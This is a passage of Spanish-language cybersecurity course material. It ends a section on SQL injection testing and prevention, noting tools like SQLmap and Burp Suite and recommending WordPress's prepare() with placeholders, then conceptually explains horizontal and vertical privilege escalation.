- [OWASP Top Ten 2017 | A1:2017-Injection | OWASP Foundation](https://owasp.org/www-project-top-ten/2017/A1_2017-Injection.html)

## Conclusión

En resumen, las pruebas de inyección SQL son una herramienta esencial para los evaluadores de penetración de aplicaciones web. En esta exploración exhaustiva, nos hemos sumergido en los principios y metodologías fundamentales que nos permiten descubrir vulnerabilidades. Hemos explorado las pruebas manuales en detalle, donde un análisis profundo de las URL, los formularios y las interacciones de los usuarios revela posibles puntos débiles.

Cuando se trata de prevenir inyecciones SQL, los campos de formulario y los mecanismos de validación son muy importantes. Sin embargo, a veces estas medidas pueden obstaculizar el proceso de prueba y es posible que los evaluadores capacitados necesiten utilizar cargas útiles de derivación. Las herramientas automatizadas como SQLmap y Burp Suite resultan invaluables para realizar evaluaciones exhaustivas.

Hemos explicado en detalle cómo funcionan las vulnerabilidades de inyección SQL y las vulnerabilidades de inyección SQL ciega. La clave para evitar estas vulnerabilidades es desinfectar y escapar de todo lo que envíe a la base de datos. En WordPress, la forma más sencilla de hacerlo es utilizando el método prepare() y marcadores de posición en su SQL. Ahora que comprende cómo los atacantes explotan estas vulnerabilidades, podrá proteger mejor sus propios sitios web y los de sus clientes.

Escalamiento de Privilegios

### **¿Cómo funcionan?**

Una de las preguntas más importantes es, ¿qué es exactamente el **[Escalamiento de Privilegios](https://en.wikipedia.org/wiki/Privilege_escalation)**? Es una situación que ocurre cuando un usuario malicioso explota una vulnerabilidad. Esta puede consistir en un bug o un fallo en el diseño de la aplicación.

También puede tratarse de cierto error de configuración de la aplicación o del sistema operativo en el cual está operando el usuario. Básicamente, lo que sucede es que el usuario malicioso termina obteniendo acceso privilegiado a recursos que, de acuerdo a sus permisos por defecto, no debería tenerlos. Dichos privilegios de acceso le darán la posibilidad de robar datos confidenciales o de carácter sensible, ejecutar comandos con permisos de administrador. O peor aún, puede arrojar malware o ransomware, lo cual dañaría tu sistema operativo en gran medida.

Especialmente, en una organización, esto puede afectar en gran medida la reputación de la misma. Esto es así ya que tanto las personas que trabajan de ella como las que no, pueden tener una percepción negativa sobre las medidas de seguridad informática que se aplican en ella. De acuerdo a lo que comentamos anteriormente, la escalación de privilegios acostumbra a ser la puerta de entrada a ataques mucho más específicos y, por ende, más severos. Uno de los aspectos más preocupantes es que estas escaladas maliciosas pueden confundirse con facilidad con las actividades diarias que se registran en la organización.

![NoSQL2](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/NoSQL2.png?raw=true)

### **¿Cómo funciona la Escalamiento de Privilegios?**

Los cibercriminales, empiezan con la explotación de alguna vulnerabilidad que permita ejecutar dicha escalada, ya sea en un sistema o aplicación. Pueden acceder tanto a datos como funcionalidades de otro usuario con mayor cantidad de privilegios (esto es el **Escalamiento Horizontal de Privilegios**) o bien, obtener privilegios elevados. Tales privilegios elevados generalmente provienen de usuarios administradores o los conocidos como *"power user"*. A esto último se lo conoce como **Escalamiento Vertical de Privilegios**.